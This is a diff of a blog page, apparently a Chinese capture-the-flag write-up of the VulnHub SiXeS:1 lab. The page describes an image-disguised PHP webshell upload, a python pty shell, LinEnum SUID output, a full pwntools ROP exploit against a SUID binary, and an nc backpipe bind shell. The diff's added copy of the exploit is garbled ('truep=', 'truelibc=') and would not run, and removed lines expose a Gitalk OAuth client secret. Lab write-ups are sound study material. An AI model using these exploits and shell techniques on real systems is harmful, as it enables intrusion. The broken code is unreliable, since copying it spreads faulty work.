@@ -109,7 +109,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="vulnHub_SiXeS_1">
 <meta property="og:url" content="http://yoursite.com/2019/10/20/vulnHub-SiXeS-1/index.html">
-<meta property="og:site_name" content="S E R N">
+<meta property="og:site_name" content="SERN">
 <meta property="og:description" content="靶机环境10-24 获得所有flag（6/6）10-20 暂未取得所有flag（4/6）官网链接：https://www.vulnhub.com/entry/sixes-1,380/下载地址：https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://i.loli.net/2019/10/20/4cIo9bnPeLUYQKS.png">
@@ -128,7 +128,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/24/TM5GeOqiswzU2hL.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/24/t74NHJXY3kgMT6d.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/20/jSB4FxRyJGVhWrH.png">
-<meta property="og:updated_time" content="2020-02-17T08:19:07.165Z">
+<meta property="og:updated_time" content="2019-10-24T02:36:28.113Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="vulnHub_SiXeS_1">
 <meta name="twitter:description" content="靶机环境10-24 获得所有flag（6/6）10-20 暂未取得所有flag（4/6）官网链接：https://www.vulnhub.com/entry/sixes-1,380/下载地址：https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova">
@@ -149,7 +149,7 @@
   };
 </script>
 
-  <title>vulnHub_SiXeS_1 | S E R N</title>
+  <title>vulnHub_SiXeS_1 | SERN</title>
   
 
 
@@ -161,7 +161,7 @@
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?a9e469ebccf853e6822194a1aec9b83d";
+      hm.src = "https://hm.baidu.com/hm.js?810c939467f41f3d42f800dd396fe6b5";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
@@ -219,7 +219,7 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">S E R N</span>
+        <span class="site-title">SERN</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -363,12 +363,12 @@
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Amadeus">
-      <meta itemprop="description" content="Der alte würfelt nicht">
+      <meta itemprop="description" content="Security Edge Research Net，一个misc选手存放日志的地方">
       <meta itemprop="image" content="https://i.loli.net/2018/12/22/5c1db6b0a0ab4.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="S E R N">
+      <meta itemprop="name" content="SERN">
     </span>
 
     
@@ -419,7 +419,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2020-02-17 16:19:07" itemprop="dateModified" datetime="2020-02-17T16:19:07+08:00">2020-02-17</time>
+                <time title="修改时间：2019-10-24 10:36:28" itemprop="dateModified" datetime="2019-10-24T10:36:28+08:00">2019-10-24</time>
               
             
           </span>
@@ -499,7 +499,7 @@
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>只允许上传图片格式的文件。但是并不是对文件后缀进行检查，而是直接看文件头。随便找一个图片文件，在末尾追加一句话木马，改名成a.php上传。<br>上传位置可以通过复制网站中其他图片的位置得到，在/img/目录下。<br><img src="https://i.loli.net/2019/10/20/LEvdO1RrU95aNyz.png" alt=""><br>之后写入反弹shell，传入meterpreter生成的shell木马就可以获得一个meterpreter环境。（msf真的香）<br><img src="https://i.loli.net/2019/10/20/UxAklcYSZCzwiEv.png" alt=""><br>之后进入/home文件夹，拿到第三个flag<br><img src="https://i.loli.net/2019/10/20/lVgDGufXq7L8oSd.png" alt=""><br>在config.php里面有sql数据库的明文密码和用户，使用这个登录数据库。<br><img src="https://i.loli.net/2019/10/20/BYnfC25D1qXtwMH.png" alt=""><br>之前生成的shell无法交互式的输入密码，这里再用python生成一个。由于远端的python需要用python3来调用，需要一点小小的修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p>
 <p>之后得到数据库<br><img src="https://i.loli.net/2019/10/20/ITnk7uVBYsgrCPZ.png" alt=""><br>使用sixes数据库，里面放着第四个flag<br><img src="https://i.loli.net/2019/10/20/ZL7eA49bRVCPcDn.png" alt=""></p>
 <h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h1><h2 id="普通用户权限"><a href="#普通用户权限" class="headerlink" title="普通用户权限"></a>普通用户权限</h2><p>问了下国外的一个老哥，他给了我一个信息搜集的脚本，可以一键搜集当前服务器上的敏感信息：<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[00;31m[-] SUID files:[00m</span><br><span class="line">-rwsr-xr-x 1 root root 40152 May 15 21:43 /snap/core/7713/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7713/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7713/bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7713/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 27608 May 15 21:43 /snap/core/7713/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7713/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7713/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7713/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7713/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7713/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jun 10 23:53 /snap/core/7713/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 20:46 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-sr-x 1 root root 106696 Aug 30 08:09 /snap/core/7713/usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7713/usr/sbin/pppd</span><br><span class="line">-rwsr-xr-x 1 root root 40152 Aug 23 12:28 /snap/core/7917/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7917/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7917/bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7917/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 27608 Aug 23 12:28 /snap/core/7917/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7917/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7917/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7917/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7917/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7917/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jun 10 23:53 /snap/core/7917/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 20:46 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-sr-x 1 root root 106696 Oct  1 10:55 /snap/core/7917/usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7917/usr/sbin/pppd</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28 12:05 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap</span><br><span class="line">-rwsr-xr-x 1 root root 18448 Jun 28 12:05 /usr/bin/traceroute6.iputils</span><br><span class="line">-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jun 10 19:05 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">-r-sr-xr-x 1 root root 243896 Sep 20 10:35 /usr/lib/chromium-browser/chrome-sandbox</span><br><span class="line">-rwsr-sr-x 1 root root 105336 Jun  5 07:41 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-r-sr-sr-x 1 webmaster webmaster 17320 Oct  3 20:24 /sbin/notemaker</span><br></pre></td></tr></table></figure></p>
-<p>可以看到suid文件里最后有一个属于webmaster的程序，除nx外没有其他防护，拉回本地进行分析。用无敌的ida看一眼，可以发现有一个大洞。<br><img src="https://i.loli.net/2019/10/24/AHvewRZP6rKtciz.png" alt=""><br>栈溢出直接写ropchain，泄露libc基址，然后ret回system搞定。<br>这里贴上我的exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">if</span>(len(sys.argv)<span class="number">-1</span>):</span><br><span class="line">	p=remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">	libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=process(<span class="string">"./notemaker"</span>)</span><br><span class="line">	libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">offset=<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">'a'</span>*offset</span><br><span class="line">poprdi=<span class="number">0x00000000004014eb</span></span><br><span class="line">poprsir15=<span class="number">0x00000000004014e9</span></span><br><span class="line">elf=ELF(<span class="string">'./notemaker'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(<span class="number">0x401222</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'bp 0x40136e'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">a=p.recvline()[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">libc_base=u64(a.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,'bp 0x40136e')</span></span><br><span class="line">sh_addr=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload=<span class="string">'a'</span>*offset</span><br><span class="line">payload+=p64(<span class="number">0x000000000040136F</span>)<span class="comment"># ret</span></span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0x401222</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>可以看到suid文件里最后有一个属于webmaster的程序，除nx外没有其他防护，拉回本地进行分析。用无敌的ida看一眼，可以发现有一个大洞。<br><img src="https://i.loli.net/2019/10/24/AHvewRZP6rKtciz.png" alt=""><br>栈溢出直接写ropchain，泄露libc基址，然后ret回system搞定。<br>这里贴上我的exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">if</span>(len(sys.argv)<span class="number">-1</span>):</span><br><span class="line">truep=remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">truelibc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">truep=process(<span class="string">"./notemaker"</span>)</span><br><span class="line">truelibc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">offset=<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">'a'</span>*offset</span><br><span class="line">poprdi=<span class="number">0x00000000004014eb</span></span><br><span class="line">poprsir15=<span class="number">0x00000000004014e9</span></span><br><span class="line">elf=ELF(<span class="string">'./notemaker'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(<span class="number">0x401222</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'bp 0x40136e'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">a=p.recvline()[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">libc_base=u64(a.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,'bp 0x40136e')</span></span><br><span class="line">sh_addr=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload=<span class="string">'a'</span>*offset</span><br><span class="line">payload+=p64(<span class="number">0x000000000040136F</span>)<span class="comment"># ret</span></span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0x401222</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
 <p>需要注意一点是在Ubuntu下进行函数调用时的栈是16位对齐的，也就是说栈顶地址务必是0x……0的形式，在这里卡了一下午，多亏@0x000c0ded的提醒。<br>通了以后就可以利用<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p </span><br><span class="line">notemaker 0&lt;/tmp/backpipe | nc -lp 4430 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure></p>
 <p>把程序挂出来，这两行命令可以规避nc -e不存在的问题。<br>之后打通就是普通用户权限</p>
 <h2 id="普通用户持久化"><a href="#普通用户持久化" class="headerlink" title="普通用户持久化"></a>普通用户持久化</h2><p>在~/下新建.ssh文件夹，把本机的ssh pub key放到里面的authorized_keys，之后就可以本机ssh免密登录靶机。</p>
@@ -623,7 +623,7 @@
               <img class="site-author-image" itemprop="image" src="https://i.loli.net/2018/12/22/5c1db6b0a0ab4.jpg" alt="Amadeus">
             
               <p class="site-author-name" itemprop="name">Amadeus</p>
-              <p class="site-description motion-element" itemprop="description">Der alte würfelt nicht</p>
+              <p class="site-description motion-element" itemprop="description">Security Edge Research Net，一个misc选手存放日志的地方</p>
           </div>
 
           
@@ -956,32 +956,6 @@
 
 
   
-  
-  <script src="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.js"></script>
-
-  
-  
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.css">
-
-  
-  
-  <script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
-
-   <script>
-        var gitalk = new Gitalk({
-          clientID: '31bd4e3112debc879d07',
-          clientSecret: 'a2e8ff9a5e17fd35e51bb5089941b48016d08810',
-          repo: 'SernRounder.github.io',
-          owner: 'SernRounder',
-          admin: ['SernRounder'],
-          id: md5(location.pathname),
-          distractionFreeMode: 'true'
-        })
-        gitalk.render('gitalk-container')
-       </script>
-
-
-  
 
 
 
@@ -1012,6 +986,6 @@
 
   
 
-  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":true,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":50,"height":85,"vOffset":-5},"mobile":{"show":false},"log":false});</script>
+  
 </body>
 </html>
